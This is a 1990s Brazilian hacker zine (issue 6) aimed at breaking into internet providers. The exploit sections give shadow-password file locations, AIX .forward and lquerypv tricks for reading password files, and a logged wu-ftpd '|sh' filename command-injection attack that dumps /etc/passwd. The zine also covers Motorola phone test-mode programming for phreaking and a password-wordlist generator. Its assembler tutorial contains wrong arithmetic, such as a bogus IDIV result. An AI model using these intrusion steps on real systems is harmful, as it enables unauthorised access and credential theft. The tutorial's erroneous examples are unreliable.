@@ -1,0 +1,480 @@
+CSZ - Cheat Struck Zine
+edição 6
+por: Cheat Struck
+
+*****************************************************************************
+Indice:
+	1. Introdução
+	2. Dicas Hacks
+	3. Kevin Mitnick
+	4. Pesquisa
+	5. VIRII
+	6. Phreaking
+	7. Bugs
+	8. Programas hackers
+	9. Hack, the Art
+	10. Preview
+
+*****************************************************************************
+1. Introdução
+	Atenção galera leitora do csz!!! Estou precisando de gente para dis-
+tribuir o zine pela rede. Please façam o que puder para passar o zine a dinte
+mas cuidado para q não chege nas mãos dos administradores/sysops para eu não
+ter q ficar aturando varios pentelhos no meu pé.
+	Eu estarei certamente todas as sextas e talvez nos sabados(quando não
+tiver o q fazer) à noite, no servidor irc.via-rs.com.br porta 6667 nos canais
+#hackers e #Senhas.
+	Já falei com os seguintes carinhas q vc poderá conseguir o zine:
+_zERo_, DieHarD, SoulSpy e Whirlwind. No começo me desentendi um pouco com o
+Whirlwind mas eu acho que no final ficou tudo bem. Há ele tava precisando de
+um editor de ansi, e pero log que eu fiz da nossa conversa, acho q passei um
+endereço errado pra ele de como o conseguir. Se vc estiver lendo agora procu-
+ra na seção pesquisa que tu deve achar.
+	Please entrem em contato comigo e critiquem, digam o que querem ver,
+me corrigam se eu errei alguma coisa ou até mesmo me perguntem o q não sabem
+pois estou pensando em fazer um FAQ hack mas vai ficar pra mais tarde.
+	Outra coisa... Talvez eu não consiga enviar o zine para todos então
+não pessam apenas para mim. Entrem no canal e pessam a quem estiver lá, quase
+sempre tem alguém q o tenha. E se quizer falar comigo é só abrir um pvt. Meu
+nick é Struck ou CStruck.
+
+*****************************************************************************
+2. Dicas hacks
+	Se vc já lêu as edições anteriores deve ter achado uma meneira fácil
+de invadir provedores q usam shadow né. É mas depois de pegar o /etc/passwd
+no lugar do password da conta tinha um *.
+	Pois é isso acontece porque o passwd estava shadowado(eta!). O local
+do verdadeiro file passwd pode ser um desses seguintes. Tente todos se não
+souber o SO.
+
+Sistema:                Diretório:                      Simbolo Shadow:
+AIX 3                   /etc/security/passwd            !
+                        /tcb/auth/files//
+A/UX 3.Os               /tcb/files/auth/?               *
+BSD4.3-Reno             /etc/master.passwd              *
+ConvexOS 10             /etc/shadpw                     *
+Convex0S 11             /etc/shadow                     *
+DG/UX                   /etc/tcb/aa/user                *
+EP/IX                   /etc/shadow                     x
+HP-UX                   /.secure/etc/passwd             *
+IRIX 5                  /etc/shadow                     x
+Linux 1.1               /etc/shadow                     *
+OSF/1                   /etc/passwd[.dir|.pag]          *
+SCO Unix #.2.x          /tcb/auth/files/
+SunOS 4.1+c2            /etc/security/passwd.adjunct    #
+SunOS 5.0               /etc/shadow                     #
+System V 4.0            /etc/shadow                     x
+System V 4.2            /etc/security/database          *
+Ultrix 4                /etc/auth[.dir|.pag]            *
+UNICOS                  /etc/udb                        *
+
+*****************************************************************************
+3. Kevin Mitnick
+	Pois é a seção voltou. Mas agora não sou mais eu quem escrevo essa
+seção, e sim Markus Hübner. Não tenho nenhum contato direto com ele mas achei
+seu texto na inet e gostei. Por isso irei coloca-lo aqui. Mas como o texto é
+meio grande, ele estará em 3 partes(eu acho).
+
+             A História de Mitnick (parte 1)
+
+                ... Por Markus Hübner ...
+
+	Kevin D. Mitnick começou suas aventuras no mundo da informática quan-
+do se uniu a um pequeno grupo de hackers num suburbio de Los Angeles/Califor-
+nia. Demonstrou sua habilidade entrando no computado da Monroe High School e
+alterando as notas medias do curso. Seus problemas legais começaram quando
+invadiu o sistema de informática da Defesa Aérea Norte America do Colorado
+ainda na idade de 17 anos ... era o ano de 1981. Pouco depois, avançou no
+phreaking com insaciável apetite por telefonia. Para obter as informacões que
+precisava sobre o assunto, Mitnick procurou nas oficinas corporativas da
+Pacific Bell e obteve manuais e software sobre o sistemas COSMOS e MicroPort.
+Devido a sua pouca idade, evitou de ter sido sentenciado. Aumentadas suas
+habilidades no final dos anos 80, Mitnick se escondeu das autoridades pelo
+ano de 1989. Agentes do FBI estavam reunindo evidencias de que Mitnick e um
+amigo chamado DiCicco, haviam roubado software secreto e pesquisas da Digital
+Equipment Corp. Também se mencionou 17 códigos de acesso de propiedade dos
+sistemas da rede de larga distancia MCI. Mitnick e DiCicco foram procurados e
+a côrte dos Estados Unidos em Los Angeles ordenou que Mitnick fosse preso sem
+possibilidade de fiança, argumentando que "quando ele está armado com um
+teclado, supõe-se uma amenaça para a comunidade".
+
+	O detetive James K. Black, chefe da unidade de crimes de informática
+do departamento de policia de Los Angeles disse de Mitnick "Está vários ní-
+veis mais acima do que poderia se definir como um hacker". Com a idade de 25
+anos, Mitnick foi sentenciado com um ano de prisão por a juiza Mariana R.
+Pfaelzer da côrte geral do distrito de Los Angeles. O juiz Pfaelzer também
+ordenou Mitnick a asistir sessões de reabilitação, alegando ser aficcionado
+aos computadores igual a um viciado à drogas. Também obtiveram uma ordem ju-
+dicial de restringir os privilégios telefônicos de Mitnick dentro da prisão,
+com medo de que pudera obter acesso a um computador remoto. Harrier Rosetto,
+diretor do centro de reabilitação disse "o hacking dá a Mitnick uma sensação
+de auto estima que não obtém no mundo real... Fica tal como uma criança
+grande ...".
+
+	Um ano depois, Mitnick foi posto em liberdade. Repetidamente, começa-
+ram a ocorrer coisas extranhas... O telefone do encarregado de sua libertade
+condicional foi repentinamente desconectado, sem que a companhia telefônica
+tivesse informado. O registro de crédito na TRW inc. de um juiz foi inexpli-
+cavelmente alterado. Mitnick não respeitou sua condicional e saiu do país
+para visitar uns amigos hackers em Israel...Uma vez mais, era um homem metido
+em problemas. Voltando aos Estados Unidos, agentes do FBI obtiveram uma ordem
+de busca e apreensão a sua residencia em Calabasas, California, em Setembro
+de 1992. Mitnick era suspeito de violar sua condicional e de hackear computa-
+dores do Departamento de Vehiculos de Motor de California. As autoridades
+também acreditavam que era responsável por crackear um sistema de informática
+da Armada e de obter acceso aos registros do FBI, outro incidente que coinci-
+dia com a técnica de Mitnick. Por Novembro de 1992, Mitnick havia desapareci-
+do da face da terra....uma vez mais, um homem procurado pelas autoridades
+federais. Desejando um rastro, o FBI cria que Mitnick simplemente hava crido
+um séie de identidades falsas. Armado com seus conhecimentos e habilidades
+isto seria uma fácil tarefa.
+
+	Indícios de sua presença começaram a aparecer outra vez em meados de
+1994 quando a Divisão de Celulares da Motorola informou que haviam feito
+cópias de seu software de controle de celular. Dan Farmer, criador do temido
+programa "SATAN" que busca debilidades em sistemas de informática, disse que
+alguém havia entrado em seu sistema e roubado uma versão ainda não lançada de
+seu programa. As técnicas da entrada eram típicas de Kevin Mitnick.
+
+(fim da parte 1)
+
+*****************************************************************************
+4. Pesquisa
+	Foi lançada a versão 2.0 da "Lista de pesquisa hacking" criada por
+mim. Ela está com alguns zines, hp hacks e tutoriais novos porém não está tão
+grande como a versão 1.01, mas vale a pena conferir...
+
+***** Lista de pesquisa hacking versão 2.0 by Cheat Struck *****
+
+### ZINE's ###
+
+* KMC Zine
+  Muito bom, especializado em bugs e exploits. pegue-o na sua própria hp
+ (listada abaixo).
+  Nota: 9,0
+
+* POLICY SECURITY E-ZINE
+  Zine especializado em segurança em UNIX. Ainda não li mas pelo indice o
+ conteudo parece razoavel.
+  Nota: 8,5 (não certo)
+
+* SAQUEADORES
+  Zine espanhol escrita por eljaker. As primeiras edições estavam muito ruins
+ mas ao passar dos tempos foi melhorando muito.
+  Nota: 9,0
+
+* Underground Zine
+  Só consegui uma edição desse zine. Está na forma de programa e requer uma
+ senha para acessa-lo, Ainda não consegui quebrar a senha por ela estar bem
+ encryptada, e por isso não tenho como lê-lo e dar-lhe uma nota.
+
+### HOME PAGES ###
+
+* Mask's Home Page v.II
+  Muito boa page com progs, links, scripts e outras coisas hacks.
+  URL : http://www.geocities.com/SiliconValley/Lab/2250
+  Nota: 9,5
+
+* Cyber Mac's Home Page
+  Ótima pagina, com tudo o que vc precissar, Tem até uma pequena lista de
+ fontes de programas em varias linguagens.
+  URL : http://www.geocities.com/CollegePack/Campus/7154
+  Nota: 10,0
+
+* Saqueadores HP
+  Page com o zine Saqueadores disponivel e tb com outros txts enteresantes
+ como por exemplo um manual para hackear sistemas WIN NT. Em espanhol.
+  URL : http://www.geocities.com/SiliconValley/8726
+  Nota: 9,0
+
+* Kmc HP
+  Zine KMC disponível... Tem uns ótimos txts, progs entre outros, e tb um
+ ótimo visual.
+  URL : http://www.thepentagon.com/kmc
+  Nota: 9,5
+
+* RWX Home Page
+  Não me lenbro bem dessa page nem sei se já visitei-a mas eu sei que lá tem
+ entre outros txts o zine RWX.
+  URL: http://www.cyberspace.org/~rwx
+
+### TUTORIAIS ###
+
+* GUIA DE CRIAÇÃO DE VÍRUS POR DARK ANGEL #1
+  Bom tutorial de criação de virus porém só fala da parte técnica.
+  Nota: 8,5
+
+*****************************************************************************
+5. VIRII
+	A terceira parte do tutorial de ASSEMBLER...
+
+----------parte3-------------------------------------------------------------
+
+##### Comando SUB #####
+Subtrai de um conjunto. Exemplo:
+
+MOV AX, 9			; AX = 9
+SUB AX, 5			; 9(AX) - 5 = 4
+MOV BX, 3			; BX = 3
+SUB AX, BX			; 4(AX) - 3(BX) = 1(AX)
+
+##### Comando MUL #####
+Multiplica um numero por ele mesmo. Sómente positio.
+Ex:
+
+MOV AX, 2			; AX = 2
+MUL AX				; 2(AX) * 2(AX) = 4
+
+##### Comando IMUL #####
+Multiplica um numero por ele mesmo. Negativo ou positivo.
+Ex:
+
+MOV AX, -2			; AX = FFFE(-2)
+MUL AX				; FFFE(-2) * FFFE(-2) = +4
+
+##### Comando DIV #####
+Divide um numero por ele mesmo. Sómente positivo.
+Ex:
+
+MOV AX, 02			; AX = 02
+DIV AX				; 02(AX) / 02(AX) = 01
+
+##### Comando IDIV #####
+Funciona como o DIV só que trabalha com numeros positivos e negativos.
+Ex:
+
+MOV AX, -02			; AX = FFFE(-02)
+IDIV AX				; FFFE(-02)(AX) / FFFE(-02)(AX) = 8001(-04)
+
+----------fim da parte3------------------------------------------------------
+
+*****************************************************************************
+6. Phreaking
+	Continuando a lista de comandos para programar o TEST MODE em celula-
+res da motorola. Atenção! Se vc não sabe como entrar no TEST MODE, leia o csz
+numero 05.
+
+### Programando TEST MODE ###
+
+11(****)# Muda o canal da transferencia **** (Recebe e Transmite em Decimal;
+          aceita 1, 2, 3, ou 4 digitos)
+
+12*# Muda o passo de força para *; (0,1-7) 0=Força maxima (3 Watts) 7=Minima
+
+13#  Power Off
+
+14#  10 kHz Signalling Tone On
+
+15#  10 kHz Signalling Tone Off
+
+16#  Setup
+
+17#  Voice
+
+18#  C-Scan
+
+     Os telephones Newer são equipados com uma caracteristica chamada C-Scan,
+     Essa opção tem o sistema de seleção standard A/B. Essa opção meio que se
+     baseia na programação do NAM2(eu acho), e será requerido o System ID.
+
+     1.  C-Scan pode apenas ser programado pelo test mode.
+
+     2.  Pressione # para acessar o test mode.
+
+     3.  Pressione 18#, o phone irá mostrar "0    40000".
+
+     4.  Entre com o primeiro system ID inibitado e pressione *.
+
+     Continue a entrar com os system ID's adicionais se requerido. Depois do
+     quinto registro o phone irá mostrar "N2". Pressione * para continuar e
+     o system ID's para o NAM 2 foi registrado.
+
+     5.  Se algum registro estava incoreto pressione CLR e re-entre.
+
+     ou
+
+     [**Phones sem a opção C-Scan esse comando será para o SEND NAM.**]
+
+18#  SEND NAM. Mostra: AA BB. Onde AA=Endereço e BB=Conteudo. Mostra o conte-
+     udo do NAM, para avancar o endereço pressione a tecla * . Para sair do
+     teste pressione a tecla #.
+     SIDH                 Sec. Code
+     OPT. (1,2,&3)        MIN
+     MIN1, MIN2           FCHNA
+     SCM                  FCHNB
+     IPCH                 NDED
+     ACCOLC               CHKSUM       GIM
+
+19#  Mostra a versão do Software.
+
+20#  Recebe mensagens erros coretos ou incoretos do controle do canal
+
+*****************************************************************************
+7. Bugs
+	Essa seção não é mais escrita por mim. Agora quem está escrevendo pra
+essa seção é rEPTILE0(e ele nem sabe). É que eu não tenho muito saco para fi-
+car fazendo uma lista de bugs, por isso todo o conteudo dessa seção a partir
+de agora não é mais responsabilidade minha.
+	Esses bugs foram retirados do zine Kmc#01 escrito por rEPTILE0. Eu
+ainda não tive o prazer de conversar com ele por isso se vc o conhece ou se
+vc é rEPTILE0 me encontre no #Hackers ou #Senha no irc.via-rs.com.br porta
+6667.
+
+AiX BuGz: 2 BuGz PaRa aiX
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+BRieFiNG: b00m, b00m, explosão na certa: AIX é uma merda, por que vc acha que
+90% dos lamerz do IRC tem shell de AIX? Porque esse sistema é um bug vivo e
+os admins de AIX são tudo antas. Será coincidencia ou um acasalamento mais do
+que perfeito? ;)
+
+### [overwrite] ###
+Sistemas afetados: não sei ao certo.
+Como arrumar: Nao use AIX. hehe. :)
+
+hehehe, tudo o que vc tem que fazer, é criar um .forward no home do usário
+com essa linha:
+
+|/arquivo/para/substituir
+
+Agora mande um  mail  para o usuario... Mas vc pensa: "putz, para que eu vou
+substituir um arquivo?!". Ah, deixa de ser burrinho e pensa bem... Se sua
+head nao explodir, vc acharah a resposta. :)
+
+### [lquery] ###
+Sistemas afetados: AIX 3.x
+Como arrumar: Nao use AIX. hehe. :)
+
+Hum, com o comando lquery vc pode lêr qualquer arquivo da maquina... Sem ter
+permissão, claro. :P Tudo o que vc tem que fazer é entrar com essa linha:
+
+/usr/sbin/lquerypv -h /etc/security/passwd
+
+Pronto. Será mostrado o passwd sem shadow. OBS!!! Eu já fiz isso  em  muitos
+lugares, mas só a senha do root apareceu encriptada. Ou seja, não trouxe uma
+lista completa do passwd... E também, SEMPRE onde mostrou o encripted do root
+, foi em um AIX com a EXISTENCIA do diretorio "/etc/security". Nos  4.x  já
+não deu... LÓGICO!
+
+*****************************************************************************
+8. Progamas hackers
+
+*Nome do produto: Dictionary Builder v1.2
+*Nome interno: Builder
+*Nome do Arquivo: BUILDER.EXE
+*Nome do Autor: |zERo|
+*Marcas Registradas: <
+*Idioma: Português(Brasil)
+*Versão do produto: 1.2
+*CopyRight: UKE 1998-99
+*Compilado em: Pascal
+*Comentarios do autor: "se tu conhece o dictionary maker, e' mil vezes mais
+ rapido(...)pode expalhar para deus e o mundo". Obs: Comentario tirado de um
+ chat com o autor.
+*Meus Comentarios: Realmente o programa é rapido e exerce varias funções mui-
+ to boas...Gostei muito desse programa, e é o melhor criador de wordlists que
+ eu já encontrei.
+*Como usar: Não tem duvida, é só seguir os passos...
+
+1. Digite o nome do arquivo a ser criado :
+2. Você quer fazer um dicionário personalizado ? s/n :
+
+	Se você responder Sim, siga estes passos...
+
+3. Digite quais caracteres quer que tenha no dicionário :
+4. Quantos caracteres você digitou acima ? :
+5. Quantos segundos de espera para mostrar as coordenadas? :
+6. Qual o numero minimo de caracteres combinados? :
+7. Qual o numero maximo de caracteres combinados? :
+
+	Já se vc responder Não, siga estes passos...
+
+3. Letras minusculas [a..z] ? s/n :
+4. Letras maiusculas [A..Z] ? s/n :
+5. Pontuação e caracteres especiais [#..&] ? s/n :
+6. Caracteres extendidos ASCII ? s/n :
+7. Espaco em branco [ ] ? s/n :
+8. Numeros [0..9] ? s/n :
+9. Quantos segundos de espera para mostrar as coordenadas? :
+10. Qual o numero minimo de caracteres combinados? :
+11. Qual o numero maximo de caracteres combinados? :
+
+	Pronto, após isso o wordlist será criado, e será mostrado o espaço de
+disco antes do file ser criado, o espaço de disco depois q o file foi criado,
+a hora em q vc começou e a hora que acabou o trabalho.
+	Na minha opinião o programa está uma maravilha, porém como foi feito
+em pascal é um alvo fácil para crackerz.
+	Para maiores informações consulte seu autor no canal #UKE no servidor
+irc.via-rs.com.br.
+
+*****************************************************************************
+9. Hack, the Art
+	Esse meio de invasão consiste em se aproveitar de um bug. Não será
+precisso de um programa exploit para isso pois é um bug bem simples, e funci-
+ona em sistemas linux(redhat, slackware) e AIX.
+	O Ftp cliente pode "enganar" o ftp server puxando um arquivo que co-
+meça com um "|" fazendo com o que o ftp server pense que o arquivo é um shell
+script e executando o que contém nesse arquivo.
+	Para você q ainda não entendeu o q fazer siga os passos andados pelo
+arquivo de log.
+
+[root@kbyte ftp]# pwd
+/home/ftp
+[root@kbyte ftp]# echo "id >> /home/ftp/OUT" >> "|sh"
+[root@kbyte ftp]# ls -lga *sh
+-rw-r--r--   1 root     root           20 Dec  3 21:19 |sh
+[root@kbyte ftp]# ftp localhost
+Connected to localhost.
+220 kbyte.org FTP server (Version wu-2.4.2-academ[BETA-11](1) Tue
+Sep 3 18:44:35 EDT 1996) ready.
+Name (localhost:root): anonymous
+331 Guest login ok, send your complete e-mail address as password.
+Password:
+230 Guest login ok, access restrictions apply.
+ftp> mget *sh
+mget |sh? y
+200 PORT command successful.
+150 Opening BINARY mode data connection for |sh (20 bytes).
+226 Transfer complete.
+20 bytes received in 0.2 secs (0.098 Kbytes/sec)
+ftp> ls OUT
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+-rw-r--r--   1 0        root         1869 Dec  3 23:22 OUT
+226 Transfer complete.
+ftp> get OUT
+local: OUT remote: OUT
+200 PORT command successful.
+150 Opening BINARY mode data connection for OUT (1869 bytes).
+226 Transfer complete.
+ftp> quit
+221 Goodbye.
+[root@kbyte ftp]# cat OUT
+uid=100(guest) gid=100(usr)
+[root@kbyte ftp]#
+
+	Em outras palavras: Vc, localmente , cria um arquivo chamado "|sh" no
+dir /home/ftp do provedor com o comando que vc quer que seja executado. Ex:
+
+echo "cat /etc/passwd >> /home/ftp/OUT" >> "|sh"
+
+	Entao vc entra no ftp(Pode ser anonymous) e executa um mget. Ex:
+
+mget *sh
+
+	Prontinho, ele tera o file passwd no /home/ftp/OUT..
+
+*****************************************************************************
+10. Preview
+	Na próxima edição...
+* VIRII				'Continuando o tutorial de assembler
+* Phreaking			'Resto dos comandos do TESTMODE(não todos)
+* Bugs				'Bugz para SunOS
+* Kevin Mitnick			'Parte 2 da história de Mitnick
+
+	Futuras publicações...
+* Lista de endereços ftp de provedores do BRASIL.
+* A volta da seção programação(talvez).
+
+*****************************************************************************
+By Cheat Struck
